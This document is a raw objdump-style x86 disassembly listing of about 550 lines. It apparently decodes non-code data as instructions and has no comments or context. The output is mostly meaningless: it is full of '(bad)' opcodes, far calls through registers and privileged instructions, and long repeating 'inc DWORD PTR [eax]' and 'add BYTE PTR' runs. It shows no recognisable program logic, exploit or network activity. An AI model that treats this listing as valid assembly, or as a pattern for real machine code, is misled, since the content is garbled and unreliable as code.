  43e7ec:	pop    ss
  43e7ed:	hlt    
  43e7ee:	call   esp
  43e7f0:	stc    
  43e7f1:	stc    
  43e7f2:	call   FWORD PTR [edi]
  43e7f4:	xchg   ebx,eax
  43e7f5:	xlat   BYTE PTR ds:[ebx]
  43e7f6:	inc    DWORD PTR [eax]
  43e7f8:	jb     0x43e7c1
  43e7fa:	push   DWORD PTR [ebx]
  43e7fc:	mov    ecx,0x8541ffdb
  43e801:	(bad)  
  43e802:	push   DWORD PTR [ecx]
  43e804:	jge    0x43e7d8
  43e806:	call   FWORD PTR [edx]
  43e808:	inc    edx
  43e809:	(bad)  
  43e80a:	inc    DWORD PTR [eax]
  43e80c:	add    dl,cl
  43e80e:	inc    DWORD PTR [eax]
  43e810:	add    cl,cl
  43e812:	inc    DWORD PTR [ebx]
  43e814:	pop    es
  43e815:	retf   
  43e816:	inc    DWORD PTR [eax]
  43e818:	sbb    bl,bl
  43e81a:	inc    DWORD PTR [eax]
  43e81c:	add    BYTE PTR [edx+0x710000ff],cl
  43e822:	inc    DWORD PTR [eax]
  43e824:	add    BYTE PTR [edi+edi*8+0x0],dl
  43e828:	add    BYTE PTR [ebx-0x1],al
  43e82b:	add    BYTE PTR [eax],al
  43e82d:	cmp    al,0xff
  43e82f:	add    BYTE PTR [eax],al
  43e831:	xor    bh,bh
  43e833:	add    BYTE PTR [eax],al
  43e835:	inc    DWORD PTR cs:[eax]
  43e838:	add    BYTE PTR [edi],dh
  43e83a:	inc    DWORD PTR [eax]
  43e83c:	add    BYTE PTR [edi],ch
  43e83e:	inc    DWORD PTR [eax]
  43e840:	add    BYTE PTR [edi+edi*8],dh
  43e843:	add    BYTE PTR [eax],al
  43e845:	cmp    bh,bh
  43e847:	add    BYTE PTR [eax],al
  43e849:	cmp    eax,0x3c0000ff
  43e84e:	inc    DWORD PTR [eax]
  43e850:	add    BYTE PTR ds:0x3a0000ff,dh
  43e856:	inc    DWORD PTR [eax]
  43e858:	add    BYTE PTR [edi+edi*8],bh
  43e85b:	add    BYTE PTR [eax],al
  43e85d:	xor    bh,bh
  43e85f:	add    BYTE PTR [eax],al
  43e861:	pop    ds
  43e862:	inc    DWORD PTR [eax]
  43e864:	add    BYTE PTR [edx],dh
  43e866:	inc    DWORD PTR [eax]
  43e868:	add    BYTE PTR [ecx],bh
  43e86a:	inc    DWORD PTR [eax]
  43e86c:	add    BYTE PTR [esi],bh
  43e86e:	inc    DWORD PTR [eax]
  43e870:	add    BYTE PTR [edi+edi*8+0x0],cl
  43e874:	add    BYTE PTR [edx-0x1],ch
  43e877:	add    BYTE PTR [eax],al
  43e879:	xchg   ecx,eax
  43e87a:	inc    DWORD PTR [eax]
  43e87c:	add    al,al
  43e87e:	inc    DWORD PTR [eax]
  43e880:	add    cl,dh
  43e882:	dec    DWORD PTR ds:0x72ffff54
  43e888:	lock bnd call DWORD PTR [ecx-0x62]
  43e88d:	into   
  43e88e:	call   FWORD PTR [edx]
  43e890:	xor    eax,0x3813ff93
  43e895:	pushf  
  43e896:	dec    DWORD PTR ds:0xbff6326
  43e89c:	adc    edx,DWORD PTR [edx-0x1]
  43e89f:	push   ss
  43e8a0:	and    ebp,DWORD PTR [edx-0x1]
  43e8a3:	sub    BYTE PTR [edx-0x5c],dl
  43e8a6:	(bad)  
  43e8a7:	cmp    DWORD PTR [ebp+0x531dffe0],ebp
  43e8ad:	fcos   
  43e8af:	add    BYTE PTR [eax],al
  43e8b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e8b2:	inc    DWORD PTR [eax]
  43e8b4:	add    BYTE PTR [esi-0x1],dh
  43e8b7:	add    BYTE PTR [eax],al
  43e8b9:	push   edx
  43e8ba:	inc    DWORD PTR [eax]
  43e8bc:	add    BYTE PTR [ecx],dh
  43e8be:	inc    DWORD PTR [eax]
  43e8c0:	add    BYTE PTR [edx],ch
  43e8c2:	inc    DWORD PTR [eax]
  43e8c4:	add    BYTE PTR [eax],ch
  43e8c6:	inc    DWORD PTR [eax]
  43e8c8:	add    BYTE PTR [edi],ah
  43e8ca:	inc    DWORD PTR [eax]
  43e8cc:	add    BYTE PTR [ecx],bh
  43e8ce:	inc    DWORD PTR [eax]
  43e8d0:	add    BYTE PTR ds:0x410000ff,dh
  43e8d6:	inc    DWORD PTR [eax]
  43e8d8:	add    BYTE PTR [edi+edi*8+0x0],ah
  43e8dc:	add    BYTE PTR [eax-0x40ddf101],cl
  43e8e2:	(bad)  
  43e8e3:	cmp    edx,DWORD PTR [eax+0x5425ffd0]
  43e8e9:	mov    bl,0xff
  43e8eb:	sbb    al,BYTE PTR [ecx-0x43]
  43e8ee:	jmp    DWORD PTR ds:0x4fffb94b
  43e8f4:	lahf   
  43e8f5:	fdivr  st,st(7)
  43e8f7:	pop    edi
  43e8f8:	shr    esp,cl
  43e8fa:	jmp    FWORD PTR [edx]
  43e8fc:	gs (bad) 
  43e900:	lods   eax,DWORD PTR ss:[esi]
  43e902:	call   DWORD PTR [esi]
  43e904:	inc    edi
  43e905:	scas   eax,DWORD PTR es:[edi]
  43e906:	call   FWORD PTR [ecx]
  43e908:	push   ebx
  43e909:	scas   al,BYTE PTR es:[edi]
  43e90a:	call   FWORD PTR [ebx]
  43e90c:	popa   
  43e90d:	sar    bh,0x19
  43e910:	inc    eax
  43e911:	mov    ds:0xb43f13ff,al
  43e916:	dec    DWORD PTR [ecx]
  43e918:	and    eax,0x3701ffb6
  43e91d:	sar    bh,1
  43e91f:	stos   BYTE PTR es:[edi],al
  43e920:	(bad)  
  43e921:	(bad)  
  43e922:	inc    ebx
  43e924:	(bad)  
  43e926:	inc    DWORD PTR [eax]
  43e928:	add    BYTE PTR [esi+0x740000ff],ch
  43e92e:	inc    DWORD PTR [eax]
  43e930:	add    BYTE PTR [ebx-0x1],al
  43e933:	add    BYTE PTR [eax],al
  43e935:	sub    al,0xff
  43e937:	add    BYTE PTR [eax],al
  43e939:	sbb    al,0xff
  43e93b:	add    BYTE PTR [eax],al
  43e93d:	sbb    bh,bh
  43e93f:	add    BYTE PTR [eax],al
  43e941:	adc    bh,bh
  43e943:	add    BYTE PTR [eax],al
  43e945:	adc    al,0xff
  43e947:	add    BYTE PTR [eax],al
  43e949:	adc    al,0xff
  43e94b:	add    BYTE PTR [eax],al
  43e94d:	adc    bh,bh
  43e94f:	add    BYTE PTR [eax],al
  43e951:	and    al,0xff
  43e953:	add    BYTE PTR [eax],al
  43e955:	inc    edi
  43e956:	inc    DWORD PTR [eax]
  43e958:	add    BYTE PTR [edi-0x1],dh
  43e95b:	add    DWORD PTR [eax],eax
  43e95d:	(bad)  
  43e95e:	inc    DWORD PTR [esi+0x3effdfde]
  43e964:	xchg   edi,eax
  43e965:	enter  0x5cff,0xb0
  43e969:	aam    0xff
  43e96b:	dec    ebx
  43e96c:	cwde   
  43e96d:	retf   
  43e96e:	push   DWORD PTR [eax]
  43e970:	push   edi
  43e971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e972:	call   FWORD PTR [esi]
  43e974:	jne    0x43e925
  43e976:	call   DWORD PTR [ebx]
  43e978:	pusha  
  43e979:	(bad)  
  43e97a:	inc    DWORD PTR [eax]
  43e97c:	pop    ecx
  43e97d:	mov    bh,0xff
  43e97f:	add    BYTE PTR [ebx],bl
  43e981:	xchg   ecx,eax
  43e982:	jmp    FWORD PTR [ebx+ebx*4]
  43e985:	int3   
  43e986:	jmp    DWORD PTR ds:0x37ffc47e
  43e98c:	outs   dx,DWORD PTR ds:[esi]
  43e98d:	mov    esp,0xb35713ff
  43e992:	dec    DWORD PTR [ebx+0x7a]
  43e995:	mov    ebx,0xbf5b32ff
  43e99a:	inc    DWORD PTR [edx-0x47]
  43e99d:	xlat   BYTE PTR ds:[ebx]
  43e99e:	jmp    DWORD PTR [edx]
  43e9a0:	nop
  43e9a1:	int3   
  43e9a2:	call   FWORD PTR ds:0x23ffbc81
  43e9a8:	mov    al,ds:0xd14effdf
  43e9ad:	(bad)  
  43e9ae:	jmp    DWORD PTR [eax]
  43e9b0:	pop    edx
  43e9b1:	in     al,0xff
  43e9b3:	push   es
  43e9b4:	add    DWORD PTR [ebp+0x720000ff],esp
  43e9ba:	inc    DWORD PTR [eax]
  43e9bc:	add    BYTE PTR [edi+edi*8+0x0],dl
  43e9c0:	add    BYTE PTR [edi],bh
  43e9c2:	inc    DWORD PTR [eax]
  43e9c4:	add    BYTE PTR [edi+edi*8],bh
  43e9c7:	add    BYTE PTR [eax],al
  43e9c9:	cmp    al,0xff
  43e9cb:	add    BYTE PTR [eax],al
  43e9cd:	inc    edi
  43e9ce:	inc    DWORD PTR [eax]
  43e9d0:	add    BYTE PTR [edx-0x1],dl
  43e9d3:	add    BYTE PTR [eax],al
  43e9d5:	pusha  
  43e9d6:	inc    DWORD PTR [eax]
  43e9d8:	add    BYTE PTR [eax-0x1],dh
  43e9db:	add    BYTE PTR [eax],al
  43e9dd:	xchg   edi,edi
  43e9df:	add    BYTE PTR [eax],al
  43e9e1:	mov    al,ds:0xc00000ff
  43e9e6:	inc    DWORD PTR [eax]
  43e9e8:	add    bh,ah
  43e9ea:	inc    DWORD PTR [edx]
  43e9ec:	cmp    bh,ch
  43e9ee:	call   esp
  43e9f0:	clc    
  43e9f1:	cli    
  43e9f2:	call   FWORD PTR [esi]
  43e9f4:	sbb    cl,0xff
  43e9f7:	add    BYTE PTR [esp+ebx*8-0x16273f01],ah
  43e9fe:	(bad)  
  43e9ff:	aas    
  43ea00:	pop    esp
  43ea01:	(bad)  
  43ea02:	call   DWORD PTR [ecx]
  43ea04:	sub    ecx,edx
  43ea06:	inc    DWORD PTR [eax]
  43ea08:	add    al,cl
  43ea0a:	inc    DWORD PTR [eax]
  43ea0c:	add    bh,al
  43ea0e:	inc    DWORD PTR [eax]
  43ea10:	add    edx,ecx
  43ea12:	inc    ebp
  43ea14:	fnclex 
  43ea16:	push   DWORD PTR [edx+0xfffeda]
  43ea1c:	add    BYTE PTR [esi+0x7b0000ff],ch
  43ea22:	inc    DWORD PTR [eax]
  43ea24:	add    BYTE PTR [edi-0x1],bl
  43ea27:	add    BYTE PTR [eax],al
  43ea29:	inc    ebp
  43ea2a:	inc    DWORD PTR [eax]
  43ea2c:	add    BYTE PTR [edi],dh
  43ea2e:	inc    DWORD PTR [eax]
  43ea30:	add    BYTE PTR [edx],dh
  43ea32:	inc    DWORD PTR [eax]
  43ea34:	add    BYTE PTR [edx],ch
  43ea36:	inc    DWORD PTR [eax]
  43ea38:	add    BYTE PTR [ebx],ah
  43ea3a:	inc    DWORD PTR [eax]
  43ea3c:	add    BYTE PTR [edi+edi*8],ah
  43ea3f:	add    BYTE PTR [eax],al
  43ea41:	sub    bh,bh
  43ea43:	add    BYTE PTR [eax],al
  43ea45:	xor    edi,edi
  43ea47:	add    BYTE PTR [eax],al
  43ea49:	sub    bh,bh
  43ea4b:	add    BYTE PTR [eax],al
  43ea4d:	inc    DWORD PTR es:[eax]
  43ea50:	add    BYTE PTR [eax],ch
  43ea52:	inc    DWORD PTR [eax]
  43ea54:	add    BYTE PTR ds:0x2e0000ff,ah
  43ea5a:	inc    DWORD PTR [eax]
  43ea5c:	add    BYTE PTR [esi],ch
  43ea5e:	inc    DWORD PTR [eax]
  43ea60:	add    BYTE PTR ds:0x340000ff,ah
  43ea66:	inc    DWORD PTR [eax]
  43ea68:	add    BYTE PTR [eax],dh
  43ea6a:	inc    DWORD PTR [eax]
  43ea6c:	add    BYTE PTR [eax],dh
  43ea6e:	inc    DWORD PTR [eax]
  43ea70:	add    BYTE PTR [eax-0x1],cl
  43ea73:	add    BYTE PTR [ecx],al
  43ea75:	pop    esi
  43ea76:	inc    DWORD PTR [ecx]
  43ea78:	add    al,0x93
  43ea7a:	inc    DWORD PTR [eax]
  43ea7c:	add    BYTE PTR [edi-0x37ffff01],bh
  43ea82:	inc    DWORD PTR [eax]
  43ea84:	add    al,bh
  43ea86:	call   DWORD PTR [edi]
  43ea88:	jp     0x43ea89
  43ea8a:	dec    DWORD PTR [ebp-0x28]
  43ea8d:	call   0x3e550891
  43ea92:	jmp    DWORD PTR [esi+eiz*1]
  43ea95:	imul   edi,edi,0x1b
  43ea98:	sub    DWORD PTR [ebx-0x1],ebx
  43ea9b:	add    BYTE PTR [edi],al
  43ea9d:	notrack call DWORD PTR [edx]
  43eaa0:	pop    ds
  43eaa1:	jmp    FWORD PTR gs:[esi]
  43eaa4:	pop    ebp
  43eaa5:	mov    ds:0xe5a43cff,eax
  43eaaa:	inc    DWORD PTR [eax]
  43eaac:	add    eax,edx
  43eaae:	inc    DWORD PTR [eax]
  43eab0:	add    BYTE PTR [ebp+0x6d0000ff],bl
  43eab6:	inc    DWORD PTR [eax]
  43eab8:	add    BYTE PTR [eax-0x1],dl
  43eabb:	add    BYTE PTR [eax],al
  43eabd:	sub    edi,edi
  43eabf:	add    BYTE PTR [eax],al
  43eac1:	sub    al,0xff
  43eac3:	add    BYTE PTR [eax],al
  43eac5:	pop    ds
  43eac6:	inc    DWORD PTR [eax]
  43eac8:	add    BYTE PTR [ebx],ch
  43eaca:	inc    DWORD PTR [eax]
  43eacc:	add    BYTE PTR [esi],ch
  43eace:	inc    DWORD PTR [eax]
  43ead0:	add    BYTE PTR [edi+edi*8],ah
  43ead3:	add    BYTE PTR [eax],al
  43ead5:	cmp    edi,edi
  43ead7:	add    BYTE PTR [eax],al
  43ead9:	inc    edx
  43eada:	inc    DWORD PTR [eax]
  43eadc:	add    BYTE PTR [ebp-0x1],bl
  43eadf:	add    BYTE PTR [eax],al
  43eae1:	xchg   edi,edi
  43eae3:	or     al,0x28
  43eae5:	(bad)  
  43eae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eae9:	sar    edi,cl
  43eaeb:	sub    DWORD PTR [ecx-0x47],edx
  43eaee:	jmp    DWORD PTR [edx]
  43eaf0:	dec    ecx
  43eaf1:	sar    edi,0x31
  43eaf4:	pushf  
  43eaf5:	in     eax,0xff
  43eaf7:	cs jbe 0x43eaca
  43eafa:	call   FWORD PTR [eax]
  43eafc:	aaa    
  43eafd:	mov    ch,0xff
  43eaff:	sbb    BYTE PTR [edi],dh
  43eb01:	lods   al,BYTE PTR ds:[esi]
  43eb02:	call   DWORD PTR [ebx]
  43eb04:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  43eb06:	call   FWORD PTR [edx]
  43eb08:	dec    ebx
  43eb09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eb0a:	call   DWORD PTR [esi+eax*2]
  43eb0d:	stos   BYTE PTR es:[edi],al
  43eb0e:	call   DWORD PTR [ecx]
  43eb10:	ss mov eax,0xa8250bff
  43eb16:	dec    DWORD PTR [edi+esi*1]
  43eb19:	into   
  43eb1a:	inc    DWORD PTR [esi+ebx*1]
  43eb1d:	sar    bh,0x1a
  43eb20:	(bad)  
  43eb22:	dec    esp
  43eb24:	(bad)  
  43eb25:	(bad)  
  43eb26:	inc    DWORD PTR [eax+eax*1]
  43eb29:	leave  
  43eb2a:	inc    DWORD PTR [eax]
  43eb2c:	add    BYTE PTR [edx+0x500000ff],al
  43eb32:	inc    DWORD PTR [eax]
  43eb34:	add    BYTE PTR [edx],dh
  43eb36:	inc    DWORD PTR [eax]
  43eb38:	add    BYTE PTR [esi],dl
  43eb3a:	inc    DWORD PTR [eax]
  43eb3c:	add    BYTE PTR [ecx],bl
  43eb3e:	inc    DWORD PTR [eax]
  43eb40:	add    BYTE PTR [eax],bl
  43eb42:	inc    DWORD PTR [eax]
  43eb44:	add    BYTE PTR [edi],cl
  43eb46:	inc    DWORD PTR [eax]
  43eb48:	add    BYTE PTR [edi],cl
  43eb4a:	inc    DWORD PTR [eax]
  43eb4c:	add    BYTE PTR [edx],dl
  43eb4e:	inc    DWORD PTR [eax]
  43eb50:	add    BYTE PTR [eax],ah
  43eb52:	inc    DWORD PTR [eax]
  43eb54:	add    BYTE PTR [ebx-0x1],al
  43eb57:	add    BYTE PTR [eax],al
  43eb59:	outs   dx,BYTE PTR ds:[esi]
  43eb5a:	inc    DWORD PTR [eax]
  43eb5c:	add    BYTE PTR [edx-0x111f5901],ch
  43eb62:	call   DWORD PTR [ebx+edi*4-0x26]
  43eb66:	dec    DWORD PTR [ecx-0x5e]
  43eb69:	sar    bh,1
  43eb6b:	sbb    eax,0x34ffb067
  43eb70:	(bad)  
  43eb71:	(bad)  
  43eb72:	(bad)  
  43eb73:	cmp    BYTE PTR [ecx-0x44e20037],dl
  43eb79:	(bad)  
  43eb7a:	inc    DWORD PTR [esi]
  43eb7c:	cmp    DWORD PTR [ebp-0x54b0e301],0xd5a04fff
  43eb86:	inc    DWORD PTR [eax]
  43eb88:	aaa    
  43eb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43eb8a:	inc    DWORD PTR [ecx]
  43eb8c:	xor    DWORD PTR [ebp-0x6ccefe01],edx
  43eb92:	push   DWORD PTR [edi]
  43eb94:	popa   
  43eb95:	lods   al,BYTE PTR ds:[esi]
  43eb96:	(bad)  
  43eb97:	cmp    al,0x5e
  43eb99:	mov    ebx,0xe9c235ff
  43eb9e:	inc    DWORD PTR [eax]
  43eba0:	or     ebx,eax
  43eba2:	inc    DWORD PTR [eax]
  43eba4:	add    BYTE PTR [ecx-0x39c2e801],ah
  43ebaa:	inc    DWORD PTR [eax]
  43ebac:	add    BYTE PTR [ebx-0x69fefd01],dl
  43ebb2:	inc    DWORD PTR [eax]
  43ebb4:	add    BYTE PTR [ecx-0x1],dh
  43ebb7:	add    BYTE PTR [eax],al
  43ebb9:	push   esp
  43ebba:	inc    DWORD PTR [eax]
  43ebbc:	add    BYTE PTR [edx-0x1],al
  43ebbf:	add    BYTE PTR [eax],al
  43ebc1:	inc    DWORD PTR cs:[eax]
  43ebc4:	add    BYTE PTR [esi],ah
  43ebc6:	inc    DWORD PTR [eax]
  43ebc8:	add    BYTE PTR [ebx],ah
  43ebca:	inc    DWORD PTR [eax]
  43ebcc:	add    BYTE PTR [eax],bh
  43ebce:	inc    DWORD PTR [eax]
  43ebd0:	add    BYTE PTR ds:0x3c0000ff,dh
  43ebd6:	inc    DWORD PTR [eax]
  43ebd8:	add    BYTE PTR [esi-0x1],cl
  43ebdb:	add    BYTE PTR [eax],al
  43ebdd:	pop    ecx
  43ebde:	inc    DWORD PTR [eax]
  43ebe0:	add    BYTE PTR [eax-0x1],dh
  43ebe3:	add    BYTE PTR [eax],al
  43ebe5:	xchg   esi,eax
  43ebe6:	inc    DWORD PTR [eax]
  43ebe8:	add    al,bl
  43ebea:	jmp    DWORD PTR ds:0xbbfff569
  43ebf0:	in     al,dx
  43ebf1:	repz call DWORD PTR [edx]
  43ebf4:	jae    0x43ebbf
  43ebf6:	jmp    FWORD PTR [esi+0x60fff0d1]
  43ebfc:	imul   esp,edi,0xffffffff
  43ebff:	add    eax,DWORD PTR [esi]
  43ec01:	(bad)  
  43ec02:	inc    DWORD PTR [eax]
  43ec04:	add    cl,cl
  43ec06:	inc    DWORD PTR [eax]
  43ec08:	add    al,cl
  43ec0a:	inc    DWORD PTR [eax]
  43ec0c:	add    al,0xc9
  43ec0e:	call   FWORD PTR [edi+edi*4-0x20001c]
  43ec15:	(bad)  
  43ec16:	call   DWORD PTR [edx+0xffffff]
  43ec1c:	add    BYTE PTR [eax-0x76ffff01],bl
  43ec22:	inc    DWORD PTR [eax]
  43ec24:	add    BYTE PTR [ebx-0x1],ah
  43ec27:	add    BYTE PTR [eax],al
  43ec29:	inc    ebx
  43ec2a:	inc    DWORD PTR [eax]
  43ec2c:	add    BYTE PTR [ebx],dh
  43ec2e:	inc    DWORD PTR [eax]
  43ec30:	add    BYTE PTR [edi+edi*8],ch
  43ec33:	add    BYTE PTR [eax],al
  43ec35:	sub    bh,bh
  43ec37:	add    BYTE PTR [eax],al
  43ec39:	daa    
  43ec3a:	inc    DWORD PTR [eax]
  43ec3c:	add    BYTE PTR [eax],ch
  43ec3e:	inc    DWORD PTR [eax]
  43ec40:	add    BYTE PTR [esi],ah
  43ec42:	inc    DWORD PTR [eax]
  43ec44:	add    BYTE PTR [ecx],ch
  43ec46:	inc    DWORD PTR [eax]
  43ec48:	add    BYTE PTR [edx],ah
  43ec4a:	inc    DWORD PTR [eax]
  43ec4c:	add    BYTE PTR ds:0x250000ff,bl
  43ec52:	inc    DWORD PTR [eax]
  43ec54:	add    BYTE PTR ds:0x300000ff,ch
  43ec5a:	inc    DWORD PTR [eax]
  43ec5c:	add    BYTE PTR [eax],ch
  43ec5e:	inc    DWORD PTR [eax]
  43ec60:	add    BYTE PTR [eax],ch
  43ec62:	inc    DWORD PTR [eax]
  43ec64:	add    BYTE PTR [edi+edi*8],ch
  43ec67:	add    BYTE PTR [eax],al
  43ec69:	sub    bh,bh
  43ec6b:	add    BYTE PTR [eax],al
  43ec6d:	cmp    bh,bh
  43ec6f:	add    BYTE PTR [eax],al
  43ec71:	dec    ebp
  43ec72:	inc    DWORD PTR [eax]
  43ec74:	add    BYTE PTR [edx-0x1],ch
  43ec77:	or     edx,DWORD PTR [edi]
  43ec79:	(bad)  
  43ec7a:	inc    DWORD PTR [eax]
  43ec7c:	pop    es
  43ec7d:	repnz inc DWORD PTR [eax]
  43ec80:	or     ebx,edi
  43ec82:	inc    DWORD PTR [eax]
  43ec84:	or     al,0xee
  43ec86:	inc    DWORD PTR [eax]
  43ec88:	add    edi,edi
  43ec8a:	call   DWORD PTR [ebx]
  43ec8c:	out    dx,ax
  43ec8e:	jmp    DWORD PTR [eax]
  43ec90:	sbb    eax,0x151eff3c
  43ec95:	notrack jmp DWORD PTR [esi]
  43ec98:	sbb    al,0x3e
  43ec9a:	dec    DWORD PTR [edi]
  43ec9c:	or     DWORD PTR [edi+edi*8],esi
  43ec9f:	or     ebx,DWORD PTR [ecx]
  43eca1:	jmp    DWORD PTR [bx]
  43eca4:	inc    esi
  43eca5:	xchg   ecx,eax
  43eca6:	dec    DWORD PTR [ecx-0x4c]
  43eca9:	loope  0x43ecaa
  43ecab:	add    BYTE PTR ds:0xffe3,al
  43ecb1:	pushf  
  43ecb2:	inc    DWORD PTR [eax]
  43ecb4:	add    BYTE PTR [ebp-0x1],ch
  43ecb7:	add    BYTE PTR [eax],al
  43ecb9:	inc    edi
  43ecba:	inc    DWORD PTR [eax]
  43ecbc:	add    BYTE PTR [edi],ch
  43ecbe:	inc    DWORD PTR [eax]
  43ecc0:	add    BYTE PTR [edi+edi*8],ah
  43ecc3:	add    BYTE PTR [eax],al
  43ecc5:	and    edi,edi
  43ecc7:	add    BYTE PTR [eax],al
  43ecc9:	and    al,0xff
  43eccb:	add    BYTE PTR [eax],al
  43eccd:	and    eax,0x270000ff
  43ecd2:	inc    DWORD PTR [eax]
  43ecd4:	add    BYTE PTR [edi+edi*8],ch
  43ecd7:	add    BYTE PTR [eax],al
  43ecd9:	xor    bh,bh
  43ecdb:	add    BYTE PTR [eax],al
  43ecdd:	inc    ecx
  43ecde:	inc    DWORD PTR [eax]
  43ece0:	add    BYTE PTR [ecx-0x1],ch
  43ece3:	add    BYTE PTR [eax],al
  43ece5:	xchg   edi,eax
  43ece6:	jmp    FWORD PTR ds:0x36ffdc6b
  43ecec:	outs   dx,BYTE PTR ds:[esi]
  43eced:	into   
  43ecee:	jmp    FWORD PTR ds:0x34ffeb95
  43ecf4:	scas   al,BYTE PTR es:[edi]
  43ecf5:	call   0xae7809f9
  43ecfa:	call   FWORD PTR ds:0x21ffaf41
  43ed00:	ds mov al,0xff
  43ed03:	adc    DWORD PTR [edx],ebp
  43ed05:	xchg   edi,eax
  43ed06:	call   FWORD PTR [ecx]
  43ed08:	cmp    al,0xa1
  43ed0a:	call   DWORD PTR [ebx]
  43ed0c:	cmp    DWORD PTR [edi-0x57dcf201],esp
  43ed12:	dec    DWORD PTR [edi]
  43ed14:	ss mov ebp,0xdc470eff
  43ed1a:	dec    DWORD PTR [ecx]
  43ed1c:	pop    ss
  43ed1d:	mov    ch,0xff
  43ed1f:	(bad)  
  43ed21:	jecxz  0x43ed22
  43ed23:	jae    0x43ed24
  43ed25:	(bad)  
  43ed26:	(bad)  
  43ed27:	cmp    ecx,DWORD PTR [edx+ebp*8-0x1]
  43ed2b:	add    BYTE PTR [eax],al
  43ed2d:	xchg   esp,eax
  43ed2e:	inc    DWORD PTR [eax]
  43ed30:	add    BYTE PTR [edx-0x1],ah
  43ed33:	add    BYTE PTR [eax],al
  43ed35:	aas    
  43ed36:	inc    DWORD PTR [eax]
  43ed38:	add    BYTE PTR [edi],ah
  43ed3a:	inc    DWORD PTR [eax]
  43ed3c:	add    BYTE PTR [edi+edi*8],dl
  43ed3f:	add    BYTE PTR [eax],al
  43ed41:	pop    ss
  43ed42:	inc    DWORD PTR [eax]
  43ed44:	add    BYTE PTR [edi],cl
  43ed46:	inc    DWORD PTR [eax]
  43ed48:	add    BYTE PTR [ebx],dl
  43ed4a:	inc    DWORD PTR [eax]
  43ed4c:	add    BYTE PTR [edi],cl
  43ed4e:	inc    DWORD PTR [eax]
  43ed50:	add    BYTE PTR [ecx],ch
  43ed52:	inc    DWORD PTR [eax]
  43ed54:	add    BYTE PTR [edx-0x1],cl
  43ed57:	add    BYTE PTR [eax],al
  43ed59:	je     0x43ed5a
  43ed5b:	add    eax,DWORD PTR ds:0xc48cffb0
  43ed61:	call   0xcff43265
  43ed66:	push   DWORD PTR [ebx]
  43ed68:	(bad)  
  43ed69:	retf   
  43ed6a:	(bad)  
  43ed6b:	ds jl  0x43ed2d
  43ed6e:	(bad)  
  43ed6f:	cmp    DWORD PTR [ecx+ebx*8-0x172bda01],ebp
  43ed76:	call   FWORD PTR [edx-0x9]
  43ed79:	cli    
  43ed7a:	push   DWORD PTR ds:0x3effae58
  43ed80:	jo     0x43ed36
  43ed82:	push   DWORD PTR ds:0x19ff9658
  43ed88:	inc    edi
  43ed89:	pushf  
  43ed8a:	jmp    FWORD PTR [eax]
  43ed8c:	(bad)  {k4}
  43ed91:	test   bh,bh
  43ed93:	push   cs
  43ed94:	and    BYTE PTR [ebx-0x184caa01],al
  43ed9a:	push   DWORD PTR [edx]
  43ed9c:	cdq    
  43ed9d:	(bad)  
  43ed9e:	inc    DWORD PTR [eax]
  43eda0:	add    al,cl
  43eda2:	inc    DWORD PTR [eax]
  43eda4:	or     ecx,DWORD PTR [edx-0x69ffff01]
  43edaa:	inc    DWORD PTR [eax]
  43edac:	add    BYTE PTR [esi+0x740000ff],bl
  43edb2:	inc    DWORD PTR [eax]
  43edb4:	add    BYTE PTR [esi-0x1],dl
  43edb7:	add    BYTE PTR [eax],al
  43edb9:	inc    DWORD PTR ds:[eax]
  43edbc:	add    BYTE PTR [edx],ch
  43edbe:	inc    DWORD PTR [eax]
  43edc0:	add    BYTE PTR [ecx],ch
  43edc2:	inc    DWORD PTR [eax]
  43edc4:	add    BYTE PTR [edi],ch
  43edc6:	inc    DWORD PTR [eax]
  43edc8:	add    BYTE PTR [eax],ah
  43edca:	inc    DWORD PTR [eax]
  43edcc:	add    BYTE PTR [ecx],bl
  43edce:	inc    DWORD PTR [eax]
  43edd0:	add    BYTE PTR [eax],ch
  43edd2:	inc    DWORD PTR [eax]
  43edd4:	add    BYTE PTR [edx],dh
  43edd6:	inc    DWORD PTR [eax]
  43edd8:	add    BYTE PTR ds:0x3e0000ff,ch
  43edde:	inc    DWORD PTR [eax]
  43ede0:	add    BYTE PTR [edi+edi*8+0x0],dl
  43ede4:	add    BYTE PTR [ecx-0x39ffff01],al
  43edea:	dec    DWORD PTR [esi]
  43edec:	dec    ecx
  43eded:	(bad)  
  43edee:	(bad)  
  43edef:	mov    edi,0xc5fffbd2
  43edf4:	(bad)  
  43edf6:	call   FWORD PTR [ebx]
  43edf8:	push   edi
  43edf9:	sar    edi,cl
  43edfb:	add    BYTE PTR [eax],al
  43edfd:	(bad)  
  43edfe:	inc    DWORD PTR [eax]
  43ee00:	add    al,cl
  43ee02:	inc    DWORD PTR [eax]
  43ee04:	add    al,cl
  43ee06:	call   FWORD PTR [ebx]
  43ee08:	sub    al,bh
  43ee0a:	call   eax
  43ee0c:	cli    
  43ee0d:	cld    
  43ee0e:	jmp    FWORD PTR [eax+0x18fff6da]
  43ee14:	jp     0x43edce
  43ee16:	call   FWORD PTR ds:0xfff9e4
  43ee1c:	add    BYTE PTR [edi+edi*8+0x0],ch
  43ee20:	add    BYTE PTR [ebp+0x5f0000ff],cl
  43ee26:	inc    DWORD PTR [eax]
  43ee28:	add    BYTE PTR [esi-0x1],cl
  43ee2b:	add    BYTE PTR [eax],al
  43ee2d:	xor    bh,bh
  43ee2f:	add    BYTE PTR [eax],al
  43ee31:	xor    bh,bh
  43ee33:	add    BYTE PTR [eax],al
  43ee35:	sub    al,0xff
  43ee37:	add    BYTE PTR [eax],al
  43ee39:	sub    bh,bh
  43ee3b:	add    BYTE PTR [eax],al
  43ee3d:	sub    al,0xff
  43ee3f:	add    BYTE PTR [eax],al
  43ee41:	sub    bh,bh
  43ee43:	add    BYTE PTR [eax],al
  43ee45:	daa    
  43ee46:	inc    DWORD PTR [eax]
  43ee48:	add    BYTE PTR [esi],ch
  43ee4a:	inc    DWORD PTR [eax]
  43ee4c:	add    BYTE PTR ds:0x210000ff,ah
  43ee52:	inc    DWORD PTR [eax]
  43ee54:	add    BYTE PTR [ecx],ah
  43ee56:	inc    DWORD PTR [eax]
  43ee58:	add    BYTE PTR [edi+edi*8],ah
  43ee5b:	add    BYTE PTR [eax],al
  43ee5d:	and    edi,edi
  43ee5f:	add    BYTE PTR [eax],al
  43ee61:	daa    
  43ee62:	inc    DWORD PTR [eax]
  43ee64:	add    BYTE PTR [edi],ah
